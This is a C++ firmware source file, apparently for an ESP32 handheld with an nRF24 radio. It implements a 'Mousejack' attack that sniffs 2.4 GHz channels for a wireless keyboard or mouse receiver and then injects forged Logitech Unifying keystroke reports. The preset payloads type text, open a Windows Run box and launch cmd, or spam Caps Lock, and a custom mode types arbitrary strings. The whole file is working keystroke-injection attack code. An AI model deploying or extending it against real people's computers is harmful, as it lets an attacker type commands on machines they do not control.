#include "nrf_mousejack.h"

#include <Arduino.h>
#include <RF24.h>
#include <freertos/task.h>
#include <string.h>

#include "../hal/encoder.h"
#include "../hal/nrf_radio.h"

NrfMousejackModule g_nrfMousejack;

// ---- Discovered device state -------------------------------------------------

static uint8_t s_targetAddr[5] = {0};
static uint8_t s_targetCh      = 2;

// ---- Payload definitions -----------------------------------------------------

// Three injection presets (Logitech Unifying keyboard reports)
// Report layout: {0x00, 0xC1, modifier, 0x00, keycode, 0x00,0x00,0x00,0x00,0x00}

struct KeyEntry {
    uint8_t modifier;
    uint8_t keycode;
};

// "Hello!" — H e l l o !
static const KeyEntry HELLO_KEYS[] = {
    {0x02, 0x0B},  // Shift+H
    {0x00, 0x08},  // e
    {0x00, 0x0F},  // l
    {0x00, 0x0F},  // l
    {0x00, 0x12},  // o
    {0x02, 0x1E},  // Shift+1 = !
};
static const uint8_t HELLO_LEN = sizeof(HELLO_KEYS) / sizeof(HELLO_KEYS[0]);

// URL open: Win+R, "cmd", Enter, "start http://example.com", Enter
// Encoded as a simple keystroke sequence
// Win+R
static const KeyEntry URL_KEYS[] = {
    {0x08, 0x15},  // GUI+r (Win+R)
    {0x00, 0x00},  // pause (release)
    {0x00, 0x06},  // c
    {0x00, 0x10},  // m
    {0x00, 0x07},  // d
    {0x00, 0x28},  // Enter
    {0x00, 0x00},  // pause
};
static const uint8_t URL_LEN = sizeof(URL_KEYS) / sizeof(URL_KEYS[0]);

// Caps lock toggle spam
static const KeyEntry CAPS_KEYS[] = {
    {0x00, 0x39},  // Caps Lock
    {0x00, 0x39},
    {0x00, 0x39},
    {0x00, 0x39},
    {0x00, 0x39},
};
static const uint8_t CAPS_LEN = sizeof(CAPS_KEYS) / sizeof(CAPS_KEYS[0]);

static const char* PAYLOAD_NAMES[] = {"Hello!", "URL Open", "Caps Spam", "Custom"};
static const uint8_t PAYLOAD_COUNT = 4;

// ---- helpers -----------------------------------------------------------------

void NrfMousejackModule::setStatus(const char* s) {
    portENTER_CRITICAL(&mux_);
    strncpy(status_, s, sizeof(status_) - 1);
    status_[sizeof(status_) - 1] = '\0';
    portEXIT_CRITICAL(&mux_);
}

// ---- NRF helpers -------------------------------------------------------------

static void sendKey(const KeyEntry& k) {
    uint8_t report[10] = {0x00, 0xC1, k.modifier, 0x00, k.keycode,
                          0x00, 0x00, 0x00, 0x00, 0x00};
    g_nrf_radio.write(report, 10);
    delayMicroseconds(8000);
    // key up
    memset(report + 2, 0, 8);
    g_nrf_radio.write(report, 10);
    delayMicroseconds(8000);
}

static bool asciiToHid(char c, uint8_t& mod, uint8_t& code) {
    if (c >= 'a' && c <= 'z') { mod = 0x00; code = (uint8_t)(0x04 + (c - 'a')); return true; }
    if (c >= 'A' && c <= 'Z') { mod = 0x02; code = (uint8_t)(0x04 + (c - 'A')); return true; }
    if (c >= '1' && c <= '9') { mod = 0x00; code = (uint8_t)(0x1E + (c - '1')); return true; }
    switch (c) {
        case '0': mod=0x00; code=0x27; return true;
        case ' ': mod=0x00; code=0x2C; return true;
        case '\n':mod=0x00; code=0x28; return true;
        case '.': mod=0x00; code=0x37; return true;
        case '-': mod=0x00; code=0x2D; return true;
        case '_': mod=0x02; code=0x2D; return true;
        case '@': mod=0x02; code=0x1F; return true;
        case '!': mod=0x02; code=0x1E; return true;
        case '?': mod=0x02; code=0x38; return true;
        case '/': mod=0x00; code=0x38; return true;
        case ':': mod=0x02; code=0x33; return true;
        case '#': mod=0x02; code=0x20; return true;
        default:  return false;
    }
}

static void injectCustomText(const char* text) {
    for (uint8_t i = 0; text[i] && i < 32; i++) {
        uint8_t mod = 0, code = 0;
        if (asciiToHid(text[i], mod, code)) {
            sendKey({mod, code});
        }
    }
}

static void injectPayload(uint8_t idx, const char* customText = nullptr) {
    const KeyEntry* keys = nullptr;
    uint8_t         len  = 0;
    switch (idx) {
        case 0: keys = HELLO_KEYS; len = HELLO_LEN; break;
        case 1: keys = URL_KEYS;   len = URL_LEN;   break;
        case 2: keys = CAPS_KEYS;  len = CAPS_LEN;  break;
        case 3: if (customText) injectCustomText(customText); return;
        default: return;
    }
    for (uint8_t i = 0; i < len; i++) {
        sendKey(keys[i]);
    }
}

// ---- Task -------------------------------------------------------------------

static void mousejackTask(void* arg) {
    NrfMousejackModule* self = reinterpret_cast<NrfMousejackModule*>(arg);

    self->setStatus("Scanning...");
    self->state_ = MjState::SCANNING;

    // ---- Scan phase: promiscuous-like sniff ----------------------------------
    bool found = false;
    uint8_t ch = 2;

    while (self->isRunning() && !found) {
        // Skip BLE advertisement channels (2, 26, 80 MHz)
        if (ch == 2 || ch == 26 || ch == 80) {
            ch++;
            if (ch > 80) ch = 2;
            continue;
        }

        if (nrfLockSpi()) {
            g_nrf_radio.setAddressWidth(2);
            uint8_t sniffAddr[2] = {0xAA, 0xAA};
            g_nrf_radio.openReadingPipe(0, sniffAddr);
            g_nrf_radio.setAutoAck(false);
            g_nrf_radio.disableCRC();
            g_nrf_radio.setDataRate(RF24_2MBPS);
            g_nrf_radio.setPALevel(RF24_PA_MAX);
            g_nrf_radio.setChannel(ch);
            g_nrf_radio.startListening();
            nrfUnlockSpi();
        }

        vTaskDelay(pdMS_TO_TICKS(3));  // dwell 3ms

        if (nrfLockSpi()) {
            if (g_nrf_radio.available()) {
                uint8_t buf[32] = {0};
                g_nrf_radio.read(buf, sizeof(buf));
                // First 5 bytes treated as device address
                memcpy(s_targetAddr, buf, 5);
                s_targetCh = ch;
                found = true;
            }
            g_nrf_radio.stopListening();
            nrfUnlockSpi();
        }

        ch++;
        if (ch > 80) ch = 3;  // wrap (skip 2)
    }

    if (!self->isRunning()) {
        self->clearTask();
        vTaskDelete(nullptr);
        return;
    }

    // ---- Locked state: wait for inject trigger -------------------------------
    self->state_ = MjState::LOCKED;
    char buf[48];
    snprintf(buf, sizeof(buf), "Found ch:%u\nOK to inject", s_targetCh);
    self->setStatus(buf);

    // Configure NRF24 for injection
    if (nrfLockSpi()) {
        g_nrf_radio.stopListening();
        g_nrf_radio.enableDynamicPayloads();
        g_nrf_radio.setAutoAck(false);
        g_nrf_radio.setCRCLength(RF24_CRC_16);
        g_nrf_radio.setAddressWidth(5);
        g_nrf_radio.setDataRate(RF24_2MBPS);
        g_nrf_radio.setChannel(s_targetCh);
        g_nrf_radio.openWritingPipe(s_targetAddr);
        nrfUnlockSpi();
    }

    while (self->isRunning()) {
        if (self->doInject_) {
            self->doInject_ = false;
            self->state_ = MjState::INJECTING;
            snprintf(buf, sizeof(buf), "Injecting...\n%s",
                     PAYLOAD_NAMES[self->payloadIdx_ % PAYLOAD_COUNT]);
            self->setStatus(buf);

            if (nrfLockSpi()) {
                injectPayload(self->payloadIdx_ % PAYLOAD_COUNT, self->getCustomText());
                nrfUnlockSpi();
            }

            self->state_ = MjState::LOCKED;
            snprintf(buf, sizeof(buf), "Done ch:%u\nOK=inject", s_targetCh);
            self->setStatus(buf);
        }
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    self->clearTask();
    vTaskDelete(nullptr);
}

// ---- IModule ----------------------------------------------------------------

bool NrfMousejackModule::init() {
    if (nrfLockSpi()) {
        available_ = g_nrf_radio.begin();
        nrfUnlockSpi();
    }
    return available_;
}

bool NrfMousejackModule::isAvailable() {
    return available_;
}

void NrfMousejackModule::start() {
    if (running_.exchange(true)) return;
    if (task_ != nullptr) { running_ = false; return; }
    doInject_   = false;
    payloadIdx_ = 0;
    state_      = MjState::SCANNING;
    xTaskCreatePinnedToCore(mousejackTask, "mousejack", 4096, this, 1, &task_, 0);
}

void NrfMousejackModule::stop() {
    if (!running_) return;
    running_ = false;
    for (int i = 0; i < 100 && task_; ++i) vTaskDelay(pdMS_TO_TICKS(10));
    task_ = nullptr;
}

void NrfMousejackModule::onEvent(uint8_t ev) {
    if (state_ == MjState::LOCKED) {
        if (ev == static_cast<uint8_t>(encoder::EVENT_OK)) {
            triggerInject();
        } else if (ev == static_cast<uint8_t>(encoder::EVENT_RIGHT)) {
            payloadIdx_ = (payloadIdx_ + 1) % PAYLOAD_COUNT;
        } else if (ev == static_cast<uint8_t>(encoder::EVENT_LEFT)) {
            payloadIdx_ = (payloadIdx_ + PAYLOAD_COUNT - 1) % PAYLOAD_COUNT;
        }
    }
}

void NrfMousejackModule::fillStats(char* buf, size_t len) {
    portENTER_CRITICAL(&mux_);
    strncpy(buf, status_, len - 1);
    buf[len - 1] = '\0';
    portEXIT_CRITICAL(&mux_);
}
